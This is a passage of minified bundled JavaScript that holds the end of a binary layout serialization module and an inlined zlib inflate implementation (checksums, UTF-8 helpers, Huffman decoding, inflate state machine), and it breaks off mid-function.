            return this.layout.encode(this.encoder(t), e, n);
          }
          getSpan(t, e) {
            return this.layout.getSpan(t, e);
          }
        }
        class c extends n.Layout {
          constructor(t, e) {
            super(-1, e), (this.layout = t), (this.discriminator = (0, n.u8)());
          }
          encode(t, e, n = 0) {
            return null == t
              ? this.discriminator.encode(0, e, n)
              : (this.discriminator.encode(1, e, n),
                this.layout.encode(t, e, n + 1) + 1);
          }
          decode(t, e = 0) {
            const n = this.discriminator.decode(t, e);
            if (0 === n) return null;
            if (1 === n) return this.layout.decode(t, e + 1);
            throw new Error("Invalid option " + this.property);
          }
          getSpan(t, e = 0) {
            const n = this.discriminator.decode(t, e);
            if (0 === n) return 1;
            if (1 === n) return this.layout.getSpan(t, e + 1) + 1;
            throw new Error("Invalid option " + this.property);
          }
        }
        function l(t) {
          if (0 === t) return !1;
          if (1 === t) return !0;
          throw new Error("Invalid bool: " + t);
        }
        function d(t) {
          return t ? 1 : 0;
        }
        function f(t) {
          const e = (0, n.u32)("length"),
            r = (0, n.struct)([
              e,
              (0, n.blob)((0, n.offset)(e, -e.span), "data"),
            ]);
          return new u(
            r,
            ({ data: t }) => t,
            (t) => ({ data: t }),
            t
          );
        }
        class h extends n.Layout {
          constructor(t, e, n) {
            super(t.span + e.span, n),
              (this.keyLayout = t),
              (this.valueLayout = e);
          }
          decode(t, e) {
            return (
              (e = e || 0),
              [
                this.keyLayout.decode(t, e),
                this.valueLayout.decode(t, e + this.keyLayout.getSpan(t, e)),
              ]
            );
          }
          encode(t, e, n) {
            n = n || 0;
            const r = this.keyLayout.encode(t[0], e, n);
            return r + this.valueLayout.encode(t[1], e, n + r);
          }
          getSpan(t, e) {
            return (
              this.keyLayout.getSpan(t, e) + this.valueLayout.getSpan(t, e)
            );
          }
        }
      })(Ul)),
    Ul);
  function jl(t) {
    let e = t.length;
    for (; --e >= 0; ) t[e] = 0;
  }
  jl(new Array(576));
  jl(new Array(60));
  jl(new Array(512));
  jl(new Array(256));
  jl(new Array(29));
  jl(new Array(30));
  var Gl = (t, e, n, r) => {
    let o = 65535 & t,
      i = (t >>> 16) & 65535,
      s = 0;
    for (; 0 !== n; ) {
      (s = n > 2e3 ? 2e3 : n), (n -= s);
      do {
        (o = (o + e[r++]) | 0), (i = (i + o) | 0);
      } while (--s);
      (o %= 65521), (i %= 65521);
    }
    return o | (i << 16);
  };
  const Vl = new Uint32Array(
    (() => {
      let t,
        e = [];
      for (var n = 0; n < 256; n++) {
        t = n;
        for (var r = 0; r < 8; r++)
          t = 1 & t ? 3988292384 ^ (t >>> 1) : t >>> 1;
        e[n] = t;
      }
      return e;
    })()
  );
  var Hl = (t, e, n, r) => {
      const o = Vl,
        i = r + n;
      t ^= -1;
      for (let s = r; s < i; s++) t = (t >>> 8) ^ o[255 & (t ^ e[s])];
      return -1 ^ t;
    },
    Zl = {
      2: "need dictionary",
      1: "stream end",
      0: "",
      "-1": "file error",
      "-2": "stream error",
      "-3": "data error",
      "-4": "insufficient memory",
      "-5": "buffer error",
      "-6": "incompatible version",
    },
    Xl = {
      Z_NO_FLUSH: 0,
      Z_FINISH: 4,
      Z_BLOCK: 5,
      Z_TREES: 6,
      Z_OK: 0,
      Z_STREAM_END: 1,
      Z_NEED_DICT: 2,
      Z_STREAM_ERROR: -2,
      Z_DATA_ERROR: -3,
      Z_MEM_ERROR: -4,
      Z_BUF_ERROR: -5,
      Z_DEFLATED: 8,
    };
  const Jl = (t, e) => Object.prototype.hasOwnProperty.call(t, e);
  var Yl = function (t) {
      const e = Array.prototype.slice.call(arguments, 1);
      for (; e.length; ) {
        const n = e.shift();
        if (n) {
          if ("object" != typeof n)
            throw new TypeError(n + "must be non-object");
          for (const e in n) Jl(n, e) && (t[e] = n[e]);
        }
      }
      return t;
    },
    Ql = (t) => {
      let e = 0;
      for (let r = 0, o = t.length; r < o; r++) e += t[r].length;
      const n = new Uint8Array(e);
      for (let r = 0, o = 0, i = t.length; r < i; r++) {
        let e = t[r];
        n.set(e, o), (o += e.length);
      }
      return n;
    };
  let $l = !0;
  try {
    String.fromCharCode.apply(null, new Uint8Array(1));
  } catch (WR) {
    $l = !1;
  }
  const td = new Uint8Array(256);
  for (let FR = 0; FR < 256; FR++)
    td[FR] =
      FR >= 252
        ? 6
        : FR >= 248
        ? 5
        : FR >= 240
        ? 4
        : FR >= 224
        ? 3
        : FR >= 192
        ? 2
        : 1;
  td[254] = td[254] = 1;
  var ed = (t) => {
      if ("function" == typeof TextEncoder && TextEncoder.prototype.encode)
        return new TextEncoder().encode(t);
      let e,
        n,
        r,
        o,
        i,
        s = t.length,
        a = 0;
      for (o = 0; o < s; o++)
        (n = t.charCodeAt(o)),
          55296 == (64512 & n) &&
            o + 1 < s &&
            ((r = t.charCodeAt(o + 1)),
            56320 == (64512 & r) &&
              ((n = 65536 + ((n - 55296) << 10) + (r - 56320)), o++)),
          (a += n < 128 ? 1 : n < 2048 ? 2 : n < 65536 ? 3 : 4);
      for (e = new Uint8Array(a), i = 0, o = 0; i < a; o++)
        (n = t.charCodeAt(o)),
          55296 == (64512 & n) &&
            o + 1 < s &&
            ((r = t.charCodeAt(o + 1)),
            56320 == (64512 & r) &&
              ((n = 65536 + ((n - 55296) << 10) + (r - 56320)), o++)),
          n < 128
            ? (e[i++] = n)
            : n < 2048
            ? ((e[i++] = 192 | (n >>> 6)), (e[i++] = 128 | (63 & n)))
            : n < 65536
            ? ((e[i++] = 224 | (n >>> 12)),
              (e[i++] = 128 | ((n >>> 6) & 63)),
              (e[i++] = 128 | (63 & n)))
            : ((e[i++] = 240 | (n >>> 18)),
              (e[i++] = 128 | ((n >>> 12) & 63)),
              (e[i++] = 128 | ((n >>> 6) & 63)),
              (e[i++] = 128 | (63 & n)));
      return e;
    },
    nd = (t, e) => {
      const n = e || t.length;
      if ("function" == typeof TextDecoder && TextDecoder.prototype.decode)
        return new TextDecoder().decode(t.subarray(0, e));
      let r, o;
      const i = new Array(2 * n);
      for (o = 0, r = 0; r < n; ) {
        let e = t[r++];
        if (e < 128) {
          i[o++] = e;
          continue;
        }
        let s = td[e];
        if (s > 4) (i[o++] = 65533), (r += s - 1);
        else {
          for (e &= 2 === s ? 31 : 3 === s ? 15 : 7; s > 1 && r < n; )
            (e = (e << 6) | (63 & t[r++])), s--;
          s > 1
            ? (i[o++] = 65533)
            : e < 65536
            ? (i[o++] = e)
            : ((e -= 65536),
              (i[o++] = 55296 | ((e >> 10) & 1023)),
              (i[o++] = 56320 | (1023 & e)));
        }
      }
      return ((t, e) => {
        if (e < 65534 && t.subarray && $l)
          return String.fromCharCode.apply(
            null,
            t.length === e ? t : t.subarray(0, e)
          );
        let n = "";
        for (let r = 0; r < e; r++) n += String.fromCharCode(t[r]);
        return n;
      })(i, o);
    },
    rd = (t, e) => {
      (e = e || t.length) > t.length && (e = t.length);
      let n = e - 1;
      for (; n >= 0 && 128 == (192 & t[n]); ) n--;
      return n < 0 || 0 === n ? e : n + td[t[n]] > e ? n : e;
    };
  var od = function () {
    (this.input = null),
      (this.next_in = 0),
      (this.avail_in = 0),
      (this.total_in = 0),
      (this.output = null),
      (this.next_out = 0),
      (this.avail_out = 0),
      (this.total_out = 0),
      (this.msg = ""),
      (this.state = null),
      (this.data_type = 2),
      (this.adler = 0);
  };
  const id = 16209;
  var sd = function (t, e) {
    let n, r, o, i, s, a, u, c, l, d, f, h, p, m, g, y, w, b, v, A, k, I, S, _;
    const T = t.state;
    (n = t.next_in),
      (S = t.input),
      (r = n + (t.avail_in - 5)),
      (o = t.next_out),
      (_ = t.output),
      (i = o - (e - t.avail_out)),
      (s = o + (t.avail_out - 257)),
      (a = T.dmax),
      (u = T.wsize),
      (c = T.whave),
      (l = T.wnext),
      (d = T.window),
      (f = T.hold),
      (h = T.bits),
      (p = T.lencode),
      (m = T.distcode),
      (g = (1 << T.lenbits) - 1),
      (y = (1 << T.distbits) - 1);
    t: do {
      h < 15 && ((f += S[n++] << h), (h += 8), (f += S[n++] << h), (h += 8)),
        (w = p[f & g]);
      e: for (;;) {
        if (
          ((b = w >>> 24),
          (f >>>= b),
          (h -= b),
          (b = (w >>> 16) & 255),
          0 === b)
        )
          _[o++] = 65535 & w;
        else {
          if (!(16 & b)) {
            if (64 & b) {
              if (32 & b) {
                T.mode = 16191;
                break t;
              }
              (t.msg = "invalid literal/length code"), (T.mode = id);
              break t;
            }
            w = p[(65535 & w) + (f & ((1 << b) - 1))];
            continue e;
          }
          for (
            v = 65535 & w,
              b &= 15,
              b &&
                (h < b && ((f += S[n++] << h), (h += 8)),
                (v += f & ((1 << b) - 1)),
                (f >>>= b),
                (h -= b)),
              h < 15 &&
                ((f += S[n++] << h), (h += 8), (f += S[n++] << h), (h += 8)),
              w = m[f & y];
            ;

          ) {
            if (
              ((b = w >>> 24),
              (f >>>= b),
              (h -= b),
              (b = (w >>> 16) & 255),
              16 & b)
            ) {
              if (
                ((A = 65535 & w),
                (b &= 15),
                h < b &&
                  ((f += S[n++] << h),
                  (h += 8),
                  h < b && ((f += S[n++] << h), (h += 8))),
                (A += f & ((1 << b) - 1)),
                A > a)
              ) {
                (t.msg = "invalid distance too far back"), (T.mode = id);
                break t;
              }
              if (((f >>>= b), (h -= b), (b = o - i), A > b)) {
                if (((b = A - b), b > c && T.sane)) {
                  (t.msg = "invalid distance too far back"), (T.mode = id);
                  break t;
                }
                if (((k = 0), (I = d), 0 === l)) {
                  if (((k += u - b), b < v)) {
                    v -= b;
                    do {
                      _[o++] = d[k++];
                    } while (--b);
                    (k = o - A), (I = _);
                  }
                } else if (l < b) {
                  if (((k += u + l - b), (b -= l), b < v)) {
                    v -= b;
                    do {
                      _[o++] = d[k++];
                    } while (--b);
                    if (((k = 0), l < v)) {
                      (b = l), (v -= b);
                      do {
                        _[o++] = d[k++];
                      } while (--b);
                      (k = o - A), (I = _);
                    }
                  }
                } else if (((k += l - b), b < v)) {
                  v -= b;
                  do {
                    _[o++] = d[k++];
                  } while (--b);
                  (k = o - A), (I = _);
                }
                for (; v > 2; )
                  (_[o++] = I[k++]),
                    (_[o++] = I[k++]),
                    (_[o++] = I[k++]),
                    (v -= 3);
                v && ((_[o++] = I[k++]), v > 1 && (_[o++] = I[k++]));
              } else {
                k = o - A;
                do {
                  (_[o++] = _[k++]),
                    (_[o++] = _[k++]),
                    (_[o++] = _[k++]),
                    (v -= 3);
                } while (v > 2);
                v && ((_[o++] = _[k++]), v > 1 && (_[o++] = _[k++]));
              }
              break;
            }
            if (64 & b) {
              (t.msg = "invalid distance code"), (T.mode = id);
              break t;
            }
            w = m[(65535 & w) + (f & ((1 << b) - 1))];
          }
        }
        break;
      }
    } while (n < r && o < s);
    (v = h >> 3),
      (n -= v),
      (h -= v << 3),
      (f &= (1 << h) - 1),
      (t.next_in = n),
      (t.next_out = o),
      (t.avail_in = n < r ? r - n + 5 : 5 - (n - r)),
      (t.avail_out = o < s ? s - o + 257 : 257 - (o - s)),
      (T.hold = f),
      (T.bits = h);
  };
  const ad = 15,
    ud = new Uint16Array([
      3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43, 51, 59,
      67, 83, 99, 115, 131, 163, 195, 227, 258, 0, 0,
    ]),
    cd = new Uint8Array([
      16, 16, 16, 16, 16, 16, 16, 16, 17, 17, 17, 17, 18, 18, 18, 18, 19, 19,
      19, 19, 20, 20, 20, 20, 21, 21, 21, 21, 16, 72, 78,
    ]),
    ld = new Uint16Array([
      1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257, 385, 513,
      769, 1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577, 0, 0,
    ]),
    dd = new Uint8Array([
      16, 16, 16, 16, 17, 17, 18, 18, 19, 19, 20, 20, 21, 21, 22, 22, 23, 23,
      24, 24, 25, 25, 26, 26, 27, 27, 28, 28, 29, 29, 64, 64,
    ]);
  var fd = (t, e, n, r, o, i, s, a) => {
    const u = a.bits;
    let c,
      l,
      d,
      f,
      h,
      p,
      m = 0,
      g = 0,
      y = 0,
      w = 0,
      b = 0,
      v = 0,
      A = 0,
      k = 0,
      I = 0,
      S = 0,
      _ = null;
    const T = new Uint16Array(16),
      B = new Uint16Array(16);
    let C,
      E,
      x,
      P = null;
    for (m = 0; m <= ad; m++) T[m] = 0;
    for (g = 0; g < r; g++) T[e[n + g]]++;
    for (b = u, w = ad; w >= 1 && 0 === T[w]; w--);
    if ((b > w && (b = w), 0 === w))
      return (o[i++] = 20971520), (o[i++] = 20971520), (a.bits = 1), 0;
    for (y = 1; y < w && 0 === T[y]; y++);
    for (b < y && (b = y), k = 1, m = 1; m <= ad; m++)
      if (((k <<= 1), (k -= T[m]), k < 0)) return -1;
    if (k > 0 && (0 === t || 1 !== w)) return -1;
    for (B[1] = 0, m = 1; m < ad; m++) B[m + 1] = B[m] + T[m];
    for (g = 0; g < r; g++) 0 !== e[n + g] && (s[B[e[n + g]]++] = g);
    if (
      (0 === t
        ? ((_ = P = s), (p = 20))
        : 1 === t
        ? ((_ = ud), (P = cd), (p = 257))
        : ((_ = ld), (P = dd), (p = 0)),
      (S = 0),
      (g = 0),
      (m = y),
      (h = i),
      (v = b),
      (A = 0),
      (d = -1),
      (I = 1 << b),
      (f = I - 1),
      (1 === t && I > 852) || (2 === t && I > 592))
    )
      return 1;
    for (;;) {
      (C = m - A),
        s[g] + 1 < p
          ? ((E = 0), (x = s[g]))
          : s[g] >= p
          ? ((E = P[s[g] - p]), (x = _[s[g] - p]))
          : ((E = 96), (x = 0)),
        (c = 1 << (m - A)),
        (l = 1 << v),
        (y = l);
      do {
        (l -= c), (o[h + (S >> A) + l] = (C << 24) | (E << 16) | x);
      } while (0 !== l);
      for (c = 1 << (m - 1); S & c; ) c >>= 1;
      if ((0 !== c ? ((S &= c - 1), (S += c)) : (S = 0), g++, 0 === --T[m])) {
        if (m === w) break;
        m = e[n + s[g]];
      }
      if (m > b && (S & f) !== d) {
        for (
          0 === A && (A = b), h += y, v = m - A, k = 1 << v;
          v + A < w && ((k -= T[v + A]), !(k <= 0));

        )
          v++, (k <<= 1);
        if (((I += 1 << v), (1 === t && I > 852) || (2 === t && I > 592)))
          return 1;
        (d = S & f), (o[d] = (b << 24) | (v << 16) | (h - i));
      }
    }
    return (
      0 !== S && (o[h + S] = ((m - A) << 24) | (64 << 16)), (a.bits = b), 0
    );
  };
  const {
      Z_FINISH: hd,
      Z_BLOCK: pd,
      Z_TREES: md,
      Z_OK: gd,
      Z_STREAM_END: yd,
      Z_NEED_DICT: wd,
      Z_STREAM_ERROR: bd,
      Z_DATA_ERROR: vd,
      Z_MEM_ERROR: Ad,
      Z_BUF_ERROR: kd,
      Z_DEFLATED: Id,
    } = Xl,
    Sd = 16180,
    _d = 16190,
    Td = 16191,
    Bd = 16192,
    Cd = 16194,
    Ed = 16199,
    xd = 16200,
    Pd = 16206,
    Od = 16209,
    Rd = (t) =>
      ((t >>> 24) & 255) +
      ((t >>> 8) & 65280) +
      ((65280 & t) << 8) +
      ((255 & t) << 24);
  function Md() {
    (this.strm = null),
      (this.mode = 0),
      (this.last = !1),
      (this.wrap = 0),
      (this.havedict = !1),
      (this.flags = 0),
      (this.dmax = 0),
      (this.check = 0),
      (this.total = 0),
      (this.head = null),
      (this.wbits = 0),
      (this.wsize = 0),
      (this.whave = 0),
      (this.wnext = 0),
      (this.window = null),
      (this.hold = 0),
      (this.bits = 0),
      (this.length = 0),
      (this.offset = 0),
      (this.extra = 0),
      (this.lencode = null),
      (this.distcode = null),
      (this.lenbits = 0),
      (this.distbits = 0),
      (this.ncode = 0),
      (this.nlen = 0),
      (this.ndist = 0),
      (this.have = 0),
      (this.next = null),
      (this.lens = new Uint16Array(320)),
      (this.work = new Uint16Array(288)),
      (this.lendyn = null),
      (this.distdyn = null),
      (this.sane = 0),
      (this.back = 0),
      (this.was = 0);
  }
  const Ld = (t) => {
      if (!t) return 1;
      const e = t.state;
      return !e || e.strm !== t || e.mode < Sd || e.mode > 16211 ? 1 : 0;
    },
    Nd = (t) => {
      if (Ld(t)) return bd;
      const e = t.state;
      return (
        (t.total_in = t.total_out = e.total = 0),
        (t.msg = ""),
        e.wrap && (t.adler = 1 & e.wrap),
        (e.mode = Sd),
        (e.last = 0),
        (e.havedict = 0),
        (e.flags = -1),
        (e.dmax = 32768),
        (e.head = null),
        (e.hold = 0),
        (e.bits = 0),
        (e.lencode = e.lendyn = new Int32Array(852)),
        (e.distcode = e.distdyn = new Int32Array(592)),
        (e.sane = 1),
        (e.back = -1),
        gd
      );
    },
    Dd = (t) => {
      if (Ld(t)) return bd;
      const e = t.state;
      return (e.wsize = 0), (e.whave = 0), (e.wnext = 0), Nd(t);
    },
    Ud = (t, e) => {
      let n;
      if (Ld(t)) return bd;
      const r = t.state;
      return (
        e < 0 ? ((n = 0), (e = -e)) : ((n = 5 + (e >> 4)), e < 48 && (e &= 15)),
        e && (e < 8 || e > 15)
          ? bd
          : (null !== r.window && r.wbits !== e && (r.window = null),
            (r.wrap = n),
            (r.wbits = e),
            Dd(t))
      );
    },
    qd = (t, e) => {
      if (!t) return bd;
      const n = new Md();
      (t.state = n), (n.strm = t), (n.window = null), (n.mode = Sd);
      const r = Ud(t, e);
      return r !== gd && (t.state = null), r;
    };
  let zd,
    Kd,
    Wd = !0;
  const Fd = (t) => {
      if (Wd) {
        (zd = new Int32Array(512)), (Kd = new Int32Array(32));
        let e = 0;
        for (; e < 144; ) t.lens[e++] = 8;
        for (; e < 256; ) t.lens[e++] = 9;
        for (; e < 280; ) t.lens[e++] = 7;
        for (; e < 288; ) t.lens[e++] = 8;
        for (fd(1, t.lens, 0, 288, zd, 0, t.work, { bits: 9 }), e = 0; e < 32; )
          t.lens[e++] = 5;
        fd(2, t.lens, 0, 32, Kd, 0, t.work, { bits: 5 }), (Wd = !1);
      }
      (t.lencode = zd), (t.lenbits = 9), (t.distcode = Kd), (t.distbits = 5);
    },
    jd = (t, e, n, r) => {
      let o;
      const i = t.state;
      return (
        null === i.window &&
          ((i.wsize = 1 << i.wbits),
          (i.wnext = 0),
          (i.whave = 0),
          (i.window = new Uint8Array(i.wsize))),
        r >= i.wsize
          ? (i.window.set(e.subarray(n - i.wsize, n), 0),
            (i.wnext = 0),
            (i.whave = i.wsize))
          : ((o = i.wsize - i.wnext),
            o > r && (o = r),
            i.window.set(e.subarray(n - r, n - r + o), i.wnext),
            (r -= o)
              ? (i.window.set(e.subarray(n - r, n), 0),
                (i.wnext = r),
                (i.whave = i.wsize))
              : ((i.wnext += o),
                i.wnext === i.wsize && (i.wnext = 0),
                i.whave < i.wsize && (i.whave += o))),
        0
      );
    };
  var Gd = (t, e) => {
      let n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y,
        w,
        b,
        v,
        A,
        k,
        I,
        S = 0;
      const _ = new Uint8Array(4);
      let T, B;
      const C = new Uint8Array([
        16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15,
      ]);
      if (Ld(t) || !t.output || (!t.input && 0 !== t.avail_in)) return bd;
      (n = t.state),
        n.mode === Td && (n.mode = Bd),
        (s = t.next_out),
        (o = t.output),
        (u = t.avail_out),
        (i = t.next_in),
        (r = t.input),
        (a = t.avail_in),
        (c = n.hold),
        (l = n.bits),
        (d = a),
        (f = u),
        (I = gd);
      t: for (;;)
        switch (n.mode) {
          case Sd:
            if (0 === n.wrap) {
              n.mode = Bd;
              break;
            }
            for (; l < 16; ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            if (2 & n.wrap && 35615 === c) {
              0 === n.wbits && (n.wbits = 15),
                (n.check = 0),
                (_[0] = 255 & c),
                (_[1] = (c >>> 8) & 255),
                (n.check = Hl(n.check, _, 2, 0)),
                (c = 0),
                (l = 0),
                (n.mode = 16181);
              break;
            }
            if (
              (n.head && (n.head.done = !1),
              !(1 & n.wrap) || (((255 & c) << 8) + (c >> 8)) % 31)
            ) {
              (t.msg = "incorrect header check"), (n.mode = Od);
              break;
            }
            if ((15 & c) !== Id) {
              (t.msg = "unknown compression method"), (n.mode = Od);
              break;
            }
            if (
              ((c >>>= 4),
              (l -= 4),
              (k = 8 + (15 & c)),
              0 === n.wbits && (n.wbits = k),
              k > 15 || k > n.wbits)
            ) {
              (t.msg = "invalid window size"), (n.mode = Od);
              break;
            }
            (n.dmax = 1 << n.wbits),
              (n.flags = 0),
              (t.adler = n.check = 1),
              (n.mode = 512 & c ? 16189 : Td),
              (c = 0),
              (l = 0);
            break;
          case 16181:
            for (; l < 16; ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            if (((n.flags = c), (255 & n.flags) !== Id)) {
              (t.msg = "unknown compression method"), (n.mode = Od);
              break;
            }
            if (57344 & n.flags) {
              (t.msg = "unknown header flags set"), (n.mode = Od);
              break;
            }
            n.head && (n.head.text = (c >> 8) & 1),
              512 & n.flags &&
                4 & n.wrap &&
                ((_[0] = 255 & c),
                (_[1] = (c >>> 8) & 255),
                (n.check = Hl(n.check, _, 2, 0))),
              (c = 0),
              (l = 0),
              (n.mode = 16182);
          case 16182:
            for (; l < 32; ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            n.head && (n.head.time = c),
              512 & n.flags &&
                4 & n.wrap &&
                ((_[0] = 255 & c),
                (_[1] = (c >>> 8) & 255),
                (_[2] = (c >>> 16) & 255),
                (_[3] = (c >>> 24) & 255),
                (n.check = Hl(n.check, _, 4, 0))),
              (c = 0),
              (l = 0),
              (n.mode = 16183);
          case 16183:
            for (; l < 16; ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            n.head && ((n.head.xflags = 255 & c), (n.head.os = c >> 8)),
              512 & n.flags &&
                4 & n.wrap &&
                ((_[0] = 255 & c),
                (_[1] = (c >>> 8) & 255),
                (n.check = Hl(n.check, _, 2, 0))),
              (c = 0),
              (l = 0),
              (n.mode = 16184);
          case 16184:
            if (1024 & n.flags) {
              for (; l < 16; ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              (n.length = c),
                n.head && (n.head.extra_len = c),
                512 & n.flags &&
                  4 & n.wrap &&
                  ((_[0] = 255 & c),
                  (_[1] = (c >>> 8) & 255),
                  (n.check = Hl(n.check, _, 2, 0))),
                (c = 0),
                (l = 0);
            } else n.head && (n.head.extra = null);
            n.mode = 16185;
          case 16185:
            if (
              1024 & n.flags &&
              ((h = n.length),
              h > a && (h = a),
              h &&
                (n.head &&
                  ((k = n.head.extra_len - n.length),
                  n.head.extra ||
                    (n.head.extra = new Uint8Array(n.head.extra_len)),
                  n.head.extra.set(r.subarray(i, i + h), k)),
                512 & n.flags && 4 & n.wrap && (n.check = Hl(n.check, r, h, i)),
                (a -= h),
                (i += h),
                (n.length -= h)),
              n.length)
            )
              break t;
            (n.length = 0), (n.mode = 16186);
          case 16186:
            if (2048 & n.flags) {
              if (0 === a) break t;
              h = 0;
              do {
                (k = r[i + h++]),
                  n.head &&
                    k &&
                    n.length < 65536 &&
                    (n.head.name += String.fromCharCode(k));
              } while (k && h < a);
              if (
                (512 & n.flags &&
                  4 & n.wrap &&
                  (n.check = Hl(n.check, r, h, i)),
                (a -= h),
                (i += h),
                k)
              )
                break t;
            } else n.head && (n.head.name = null);
            (n.length = 0), (n.mode = 16187);
          case 16187:
            if (4096 & n.flags) {
              if (0 === a) break t;
              h = 0;
              do {
                (k = r[i + h++]),
                  n.head &&
                    k &&
                    n.length < 65536 &&
                    (n.head.comment += String.fromCharCode(k));
              } while (k && h < a);
              if (
                (512 & n.flags &&
                  4 & n.wrap &&
                  (n.check = Hl(n.check, r, h, i)),
                (a -= h),
                (i += h),
                k)
              )
                break t;
            } else n.head && (n.head.comment = null);
            n.mode = 16188;
          case 16188:
            if (512 & n.flags) {
              for (; l < 16; ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              if (4 & n.wrap && c !== (65535 & n.check)) {
                (t.msg = "header crc mismatch"), (n.mode = Od);
                break;
              }
              (c = 0), (l = 0);
            }
            n.head && ((n.head.hcrc = (n.flags >> 9) & 1), (n.head.done = !0)),
              (t.adler = n.check = 0),
              (n.mode = Td);
            break;
          case 16189:
            for (; l < 32; ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            (t.adler = n.check = Rd(c)), (c = 0), (l = 0), (n.mode = _d);
          case _d:
            if (0 === n.havedict)
              return (
                (t.next_out = s),
                (t.avail_out = u),
                (t.next_in = i),
                (t.avail_in = a),
                (n.hold = c),
                (n.bits = l),
                wd
              );
            (t.adler = n.check = 1), (n.mode = Td);
          case Td:
            if (e === pd || e === md) break t;
          case Bd:
            if (n.last) {
              (c >>>= 7 & l), (l -= 7 & l), (n.mode = Pd);
              break;
            }
            for (; l < 3; ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            switch (((n.last = 1 & c), (c >>>= 1), (l -= 1), 3 & c)) {
              case 0:
                n.mode = 16193;
                break;
              case 1:
                if ((Fd(n), (n.mode = Ed), e === md)) {
                  (c >>>= 2), (l -= 2);
                  break t;
                }
                break;
              case 2:
                n.mode = 16196;
                break;
              case 3:
                (t.msg = "invalid block type"), (n.mode = Od);
            }
            (c >>>= 2), (l -= 2);
            break;
          case 16193:
            for (c >>>= 7 & l, l -= 7 & l; l < 32; ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            if ((65535 & c) != ((c >>> 16) ^ 65535)) {
              (t.msg = "invalid stored block lengths"), (n.mode = Od);
              break;
            }
            if (
              ((n.length = 65535 & c),
              (c = 0),
              (l = 0),
              (n.mode = Cd),
              e === md)
            )
              break t;
          case Cd:
            n.mode = 16195;
          case 16195:
            if (((h = n.length), h)) {
              if ((h > a && (h = a), h > u && (h = u), 0 === h)) break t;
              o.set(r.subarray(i, i + h), s),
                (a -= h),
                (i += h),
                (u -= h),
                (s += h),
                (n.length -= h);
              break;
            }
            n.mode = Td;
            break;
          case 16196:
            for (; l < 14; ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            if (
              ((n.nlen = 257 + (31 & c)),
              (c >>>= 5),
              (l -= 5),
              (n.ndist = 1 + (31 & c)),
              (c >>>= 5),
              (l -= 5),
              (n.ncode = 4 + (15 & c)),
              (c >>>= 4),
              (l -= 4),
              n.nlen > 286 || n.ndist > 30)
            ) {
              (t.msg = "too many length or distance symbols"), (n.mode = Od);
              break;
            }
            (n.have = 0), (n.mode = 16197);
          case 16197:
            for (; n.have < n.ncode; ) {
              for (; l < 3; ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              (n.lens[C[n.have++]] = 7 & c), (c >>>= 3), (l -= 3);
            }
            for (; n.have < 19; ) n.lens[C[n.have++]] = 0;
            if (
              ((n.lencode = n.lendyn),
              (n.lenbits = 7),
              (T = { bits: n.lenbits }),
              (I = fd(0, n.lens, 0, 19, n.lencode, 0, n.work, T)),
              (n.lenbits = T.bits),
              I)
            ) {
              (t.msg = "invalid code lengths set"), (n.mode = Od);
              break;
            }
            (n.have = 0), (n.mode = 16198);
          case 16198:
            for (; n.have < n.nlen + n.ndist; ) {
              for (
                ;
                (S = n.lencode[c & ((1 << n.lenbits) - 1)]),
                  (g = S >>> 24),
                  (y = (S >>> 16) & 255),
                  (w = 65535 & S),
                  !(g <= l);

              ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              if (w < 16) (c >>>= g), (l -= g), (n.lens[n.have++] = w);
              else {
                if (16 === w) {
                  for (B = g + 2; l < B; ) {
                    if (0 === a) break t;
                    a--, (c += r[i++] << l), (l += 8);
                  }
                  if (((c >>>= g), (l -= g), 0 === n.have)) {
                    (t.msg = "invalid bit length repeat"), (n.mode = Od);
                    break;
                  }
                  (k = n.lens[n.have - 1]),
                    (h = 3 + (3 & c)),
                    (c >>>= 2),
                    (l -= 2);
                } else if (17 === w) {
                  for (B = g + 3; l < B; ) {
                    if (0 === a) break t;
                    a--, (c += r[i++] << l), (l += 8);
                  }
                  (c >>>= g),
                    (l -= g),
                    (k = 0),
                    (h = 3 + (7 & c)),
                    (c >>>= 3),
                    (l -= 3);
                } else {
                  for (B = g + 7; l < B; ) {
                    if (0 === a) break t;
                    a--, (c += r[i++] << l), (l += 8);
                  }
                  (c >>>= g),
                    (l -= g),
                    (k = 0),
                    (h = 11 + (127 & c)),
                    (c >>>= 7),
                    (l -= 7);
                }
                if (n.have + h > n.nlen + n.ndist) {
                  (t.msg = "invalid bit length repeat"), (n.mode = Od);
                  break;
                }
                for (; h--; ) n.lens[n.have++] = k;
              }
            }
            if (n.mode === Od) break;
            if (0 === n.lens[256]) {
              (t.msg = "invalid code -- missing end-of-block"), (n.mode = Od);
              break;
            }
            if (
              ((n.lenbits = 9),
              (T = { bits: n.lenbits }),
              (I = fd(1, n.lens, 0, n.nlen, n.lencode, 0, n.work, T)),
              (n.lenbits = T.bits),
              I)
            ) {
              (t.msg = "invalid literal/lengths set"), (n.mode = Od);
              break;
            }
            if (
              ((n.distbits = 6),
              (n.distcode = n.distdyn),
              (T = { bits: n.distbits }),
              (I = fd(2, n.lens, n.nlen, n.ndist, n.distcode, 0, n.work, T)),
              (n.distbits = T.bits),
              I)
            ) {
              (t.msg = "invalid distances set"), (n.mode = Od);
              break;
            }
            if (((n.mode = Ed), e === md)) break t;
          case Ed:
            n.mode = xd;
          case xd:
            if (a >= 6 && u >= 258) {
              (t.next_out = s),
                (t.avail_out = u),
                (t.next_in = i),
